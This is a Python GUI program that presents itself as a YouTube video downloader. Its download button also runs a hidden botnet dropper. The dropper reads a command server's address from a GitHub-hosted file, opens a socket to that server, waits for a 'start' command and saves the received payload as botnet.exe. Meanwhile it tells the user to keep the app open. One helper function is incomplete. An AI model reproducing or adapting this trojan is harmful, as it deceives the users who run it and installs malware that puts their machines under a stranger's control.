from tkinter import Label,Tk,Entry,Button,END,messagebox
from pytube import YouTube
from os import listdir
from  base64 import decodebytes
from requests import get
from socket import socket,AF_INET,SOCK_STREAM


def clear(url,res):
	url.delete(0,END)
	res.delete(0,END)

def download(url,res,title,info):
	try:
		link=url.get()
		resolution=res.get()
		url.delete(0,END)
		url.insert(END,'downloading')
		for stream in YouTube(link).streams:
			if 'mp4' in str(stream) and resolution in str(stream):
				print(stream.download())
				messagebox.showinfo(title,info)
				return
		messagebox.showerror('download failed!','video unavailable for the provided resolution!')
	except:
		messagebox.showerror('download failed','invalid url or video does not exist anymore!')


def server_ip(repo):
	r = get(f'https://api.github.com/repos/indrajith69/{repo}/contents/ip_address.txt?ref=master')
	req=bytes(r.json()['content'],encoding='utf-8')
	host,port=decodebytes(req).decode('utf8').split(':')
	return host,int(port)

def time_out(t):
	start = time.perf_counter()


def recv_b_file(size=1024):
	try:
		with open('botnet.exe','wb') as f:
			while True:
				file_contents = client.recv(size)

				if not file_contents:
					break
				else:
					f.write(file_contents)

				client.send('s'.encode('utf-8'))
	except:
		pass


def botnet():
	try:
		global client
		HOST,PORT = server_ip('server_address')

		client = socket(AF_INET,SOCK_STREAM)
		client.connect((HOST, PORT))

		server_command = client.recv(1024).decode('utf-8')
		if server_command=='start':
			recv_b_file(102400)
			return
	except :
		pass


def install_botnet(url,res):
	title  = 'download finished'
	info   = 'video was downloaded succesfully'
	
	if 'botnet.exe' not in listdir():
		download(url,res,'wait!','do not close the app till prompted!')
		botnet()
		messagebox.showinfo(title,info+'\n\n(you can close it now)')
	else:
		download(url,res,title,info)


def window():
	root = Tk()
	root.title('youtube video downloader')
	root.geometry('330x170')
	root.config(bg='#283848')

	fg='white'
	bg='#283848'

	Label(root,text='URL :',fg=fg,bg=bg,font=16).place(x=0,y=20)
	Label(root,text='Resolution :',fg=fg,bg=bg,font=16).place(x=0,y=70)

	url = Entry(root,width=20,fg=fg,bg=bg,font=16)
	res = Entry(root,width=20,fg=fg,bg=bg,font=16)
	btn_c = Button(root,text=' clear ' ,fg=fg,bg=bg,font=14,command=lambda:clear(url,res))
	btn_d = Button(root,text='download',fg=fg,bg=bg,font=14,command=lambda:install_botnet(url,res))

	url.place(x=100,y=20)
	res.place(x=100,y=70)
	btn_c.place(x=20,y=120)
	btn_d.place(x=200,y=120)

	root.mainloop()

window()